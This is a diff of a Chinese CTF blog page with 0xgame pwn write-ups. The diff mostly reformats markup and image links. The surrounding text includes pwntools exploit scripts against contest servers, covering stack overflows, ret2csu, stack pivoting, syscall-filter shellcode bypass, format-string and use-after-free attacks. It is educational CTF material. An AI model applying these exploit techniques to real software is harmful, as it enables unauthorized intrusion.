@@ -62,24 +62,33 @@
       <span class="post-date">
         January 2, 2024
       </span>
+
       
-      <span class="post-tags">
-        &middot;
         
-        <a class="tag" href="/tags/pwn/">#pwn</a>
+
         
-        <a class="tag" href="/tags/ctf/">#ctf</a>
         
-      </span>
+
+        
+        <span class="post-tags">
+          &middot;
+          
+            <a class="tag" href="/tags/pwn/">#pwn</a>
+          
+            <a class="tag" href="/tags/ctf/">#ctf</a>
+          
+        </span>
+        
       
+
     </div>
   </header>
 
   
-  
-  <aside class="toc" id="toc">
-    <h4 class="toc-title">Table of Contents</h4>
-    <nav id="TableOfContents">
+    
+    <aside class="toc" id="toc">
+      <h4 class="toc-title">Table of Contents</h4>
+      <nav id="TableOfContents">
   <ul>
     <li><a href="#0xgame-week1">0xgame week1</a>
       <ul>
@@ -103,18 +112,18 @@
     </li>
   </ul>
 </nav>
-  </aside>
-  
+    </aside>
+    
   
 
   <div class="post-content">
-    <p><img src="http://ret2ldz.github.io/images/0.png" alt="logo"></p>
+    <p>![logo](http://ret2ldz.github.io/images/0.png null)</p>
 <p>一个很不错的新生赛</p>
 <h1 id="0xgame-week1">0xgame week1</h1>
 <p>😊</p>
-<h4 id="week-1-0-test-your-nc">*<strong>[Week 1] 0. test your nc*</strong></h4>
+<h4 id="week-1-0-test-your-nc"><strong>[Week 1] 0. test your nc</strong></h4>
 <p>太简单了，略</p>
-<h4 id="week-1-1-test-your-pwntools">*<strong>[Week 1] 1. test your pwntools*</strong></h4>
+<h4 id="week-1-1-test-your-pwntools"><strong>[Week 1] 1. test your pwntools</strong></h4>
 <p>大概就是，接收收到的算式然后立刻返回答案，上代码</p>
 <pre tabindex="0"><code>from pwn import *
 io = remote(&#39;47.97.58.52&#39;,40010)
@@ -125,7 +134,7 @@ while(1):
    result = str(eval(result)).encode()
    io.sendline(result)
 io.interactive()
-</code></pre><h4 id="week-1-2-stack-overflow">*<strong>[Week 1] 2. stack overflow*</strong></h4>
+</code></pre><h4 id="week-1-2-stack-overflow"><strong>[Week 1] 2. stack overflow</strong></h4>
 <p>ida反编译如下：</p>
 <!-- raw HTML omitted -->
 <p>注意语句 signal(11,getflag); 其中getflag只会给你半个flag，所以需要绕过11号报错，即sigment fault。加俩ret指令就可，所以代码如下。</p>
@@ -136,7 +145,7 @@ context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
 io.recvuntil(b&#39;her:\n&#39;)
 io.send(b&#39;A&#39;*32 + p64(0x40101a) + p64(0x40101a) + p64(0x4012BD))
 io.interactive()
-</code></pre><h4 id="week-1-3-positive">*<strong>[Week 1] 3. positive*</strong></h4>
+</code></pre><h4 id="week-1-3-positive"><strong>[Week 1] 3. positive</strong></h4>
 <!-- raw HTML omitted -->
 <p>显然是个整数溢出题，溢出整数buf为‘-1’因为类型转换的问题nbytes比较会失效，造成最后read函数存在栈溢出漏洞，直接给代码</p>
 <pre tabindex="0"><code>from pwn import *
@@ -150,11 +159,11 @@ io.send(b&#39;-1&#39;)
 io.recvuntil(b&#39;walking:&#39;)
 io.send(b&#39;A&#39;*56 +p64(0x40101a) + p64(0x40126A))
 io.interactive()
-</code></pre><h4 id="week-1-4-find_me">*<strong>[Week 1] 4. find_me*</strong></h4>
+</code></pre><h4 id="week-1-4-find_me"><strong>[Week 1] 4. find_me</strong></h4>
 <p>main函数如下</p>
 <!-- raw HTML omitted -->
 <p>do_bad()函数如下</p>
-<p><img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/%E5%9B%BE%E7%89%87-12-1024x687.png" alt="img"></p>
+<p>![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/图片-12-1024x687.png null)</p>
 <p>通过时间为种子生成随机数，打开v4次fake_flag，每次打开都会使新产生的文件描述符增加1，所以我们需要绕过随机数，然后在do_bad()函数中，将正确的文件描述符“找出来”，将flag写入&amp;what，再从&amp;what读出来</p>
 <p>这时候需要用到ctypes库了</p>
 <p>ctypes 是Python的外部函数库。它提供了C兼容 数据类型，并允许调用 DLL 或共享库中的函数。它可以是 用于将这些库包装在纯Python中.</p>
@@ -182,7 +191,7 @@ io.sendline(b&#39;1&#39;)
 sleep(0.3)
 io.sendline(b&#39;2&#39;)
 io.interactive()
-</code></pre><h4 id="week-1-5-where_is_my_binsh">*<strong>[Week 1] 5. where_is_my_binsh*</strong></h4>
+</code></pre><h4 id="week-1-5-where_is_my_binsh"><strong>[Week 1] 5. where_is_my_binsh</strong></h4>
 <p>很简单的栈溢出</p>
 <pre tabindex="0"><code>from pwn import *
 #io = process(&#39;./pwn3&#39;)
@@ -194,9 +203,9 @@ pop_rdi_ret = 0x401323
 io.send(b&#39;/bin/sh\x00&#39;)
 io.send(b&#39;A&#39;*24 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(0x40101a) + p64(sys_plt))
 io.interactive()
-</code></pre><h4 id="week-1-6-ret2csu">*<strong>[Week 1] 6. ret2csu*</strong></h4>
-<p><img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/%E5%9B%BE%E7%89%87-13-1024x548.png" alt="img"></p>
-<p><img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/%E5%9B%BE%E7%89%87-14-1024x388.png" alt="img"></p>
+</code></pre><h4 id="week-1-6-ret2csu"><strong>[Week 1] 6. ret2csu</strong></h4>
+<p>![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/图片-13-1024x548.png null)</p>
+<p>![img](http://www.leidongzheng.com/wp-content/uploads/2024/10/图片-14-1024x388.png null)</p>
 <p>题目中发现了execve的got表</p>
 <p>ret2csu就是用loc_4013B6的gadget将需要的参数压入r12,r13,r14,r15</p>
 <p>公式是：rbx=0, rbp=1, r12=args1, r13=args2,</p>
@@ -349,7 +358,7 @@ while True:
        h()
     except:
        io.close()
-</code></pre><p><img src="http://ret2ldz.github.io/images/14.png" alt="logo"></p>
+</code></pre><p>![logo](http://ret2ldz.github.io/images/14.png null)</p>
 <h4 id="week-2-srop">[Week 2] SROP</h4>
 <p>这题之后会放在SROP栏目里讲解</p>
 <h4 id="week-2-syscall-playground">[Week 2] Syscall playground</h4>
@@ -379,7 +388,7 @@ io.interactive()
 <p>让我想到了moe的travel of stack那题。所以临时翻了一下moe的题解，终于搞明白了,这题是关于多次栈迁移的。</p>
 <p>什么是多次栈迁移，如何多次栈迁移呢？我们需要利用read函数的汇编代码来分析：
 *<strong>多次栈迁移一般用于需要泄露libc地址或者只有一次输入的时候*</strong></p>
-<p><img src="http://ret2ldz.github.io/images/17.png" alt="logo"></p>
+<p>![logo](http://ret2ldz.github.io/images/17.png null)</p>
 <p>我们可以看到read的第二个参数rsi是由rax赋值的，rsi应该存储我们buf的地址，而这个buf地址是由***lea rax,[rbp + buf]***确定的，也就是说，*<strong>我们buf存储我们输入的地址是由rbp确定的！*</strong></p>
 <p>那么如果我们第一次传入payload0=padding + bss_fake_stack + read_addr</p>
 <p>我们的rbp会被移动到bss_fake_stack,而rsp依旧停留在栈内，接下来程序会调用read，而read存储我们输入的地址buf_addr又是由rbp决定，也就是说，我们的输入会被放在bss段内，接下来执行完read后还会执行leave_ret，而我们需要做的就是把rbp再次迁移到我们输入的代码中进行。下面放一个板子</p>
@@ -389,7 +398,7 @@ paylaod n = next_rbp(addr1) + shellcode + padding + read_addr + addr1(bss_addr) 
 <p>1.payload0会把rbp送到bss_addr,而rsp依旧停留在栈内</p>
 <p>2.执行完read函数后rbp被弹到我们输入到bss_addr处的addr1，而rsp被移动到bss_addr,紧接着执行我们传入的leave-ret-addr使rbp被移动到next_rbp，rsp又再次移动到之前rbp的位置+1即&amp;shellcode，然后执行我们的shellcode进而再通过read进行下一次跳转</p>
 <p>于是我们来看题，vuln函数如下：return read(0,buf,0x30uLL);</p>
-<p><img src="http://ret2ldz.github.io/images/18.png" alt="logo"></p>
+<p>![logo](http://ret2ldz.github.io/images/18.png null)</p>
 <p>这道题的难点主要在read只读入0x30字节</p>
 <p>按照正常泄露地址的流程：</p>
 <p>payload = next_rbp + pop_rdi_ret + puts_got + puts_plt + read_addr + bss-0x20 + leave_ret一共会有0x38个字节。</p>
@@ -433,7 +442,7 @@ io.interactive()
 <p>从这题看出来我的shellcode编写能力实在差劲。。。</p>
 <p>题目逻辑如下，输入的内容中不能包含\xf\x5也就是指令syscall。</p>
 <p>首先先考虑这题如何做，看到题目开了沙箱，只能使用ORW，但是10字节肯定不够执行ORW，所以要先构造一次read读入shellcode，shellcode就存在之后的buf里继续执行</p>
-<p><img src="http://ret2ldz.github.io/images/19.png" alt="logo"></p>
+<p>![logo](http://ret2ldz.github.io/images/19.png null)</p>
 <p>但是syscall被禁了，如何绕过呢？于是有以下方法：</p>
 <p>1.构造一个0xf05(通过运算得出），并将其储存在寄存器中，最后call 这个寄存器。</p>
 <p>2.利用mov byte ptr [addr],5将5写入buf之后的内存</p>
@@ -466,13 +475,13 @@ io.send(asm(payload1))
 io.interactive()               
 </code></pre><h4 id="week-3-fmt2orw">[Week 3] fmt2orw</h4>
 <p>主函数逻辑
-<img src="http://ret2ldz.github.io/images/21.png" alt="logo"></p>
+![logo](http://ret2ldz.github.io/images/21.png null)</p>
 <p>say()：
-<img src="http://ret2ldz.github.io/images/22.png" alt="logo"></p>
+![logo](http://ret2ldz.github.io/images/22.png null)</p>
 <p>seccomp规则：只允许open，read，write，mprotect</p>
 <p>所以这题该怎么打呢。。。原来是非栈上格式化字符串，具体知识点就不介绍了，非栈上格式化字符串还是很好理解的，就是没法任意地址写和任意地址读。</p>
 <p>这题需要做的是orw，但是buf又没执行权限，但是我们看到程序里有：</p>
-<p><img src="http://ret2ldz.github.io/images/23.png" alt="logo"></p>
+<p>![logo](http://ret2ldz.github.io/images/23.png null)</p>
 <p>但是这题开了pie，因此做题步骤就很清晰了：</p>
 <p>先搭链子==&gt;泄露main地址==&gt;把ret_addr改为what_addr==&gt;把下一个字节改为shellcode的地址，最后直接传入stop + shellcode达成攻击，exp如下：</p>
 <pre tabindex="0"><code>from pwn import *
@@ -523,9 +532,9 @@ io.interactive()
 </code></pre><p>总体来说，week3还是挺难的，但是还好就三道题，三天干掉嘿嘿嘿。</p>
 <h1 id="0xgame-week4">0xgame week4</h1>
 <h4 id="week-4-uaf">[Week 4] UAF</h4>
-<p><img src="http://ret2ldz.github.io/images/24.png" alt="logo"></p>
+<p>![logo](http://ret2ldz.github.io/images/24.png null)</p>
 <p>经典菜单题，没有后门函数，所以考虑用onegadget打malloc_hook</p>
-<p><img src="http://ret2ldz.github.io/images/26.png" alt="logo"></p>
+<p>![logo](http://ret2ldz.github.io/images/26.png null)</p>
 <p>dele函数有uaf漏洞</p>
 <p>直接通过unsorted bins泄露libc基址然后打uaf劫持malloc</p>
 <p>上代码</p>
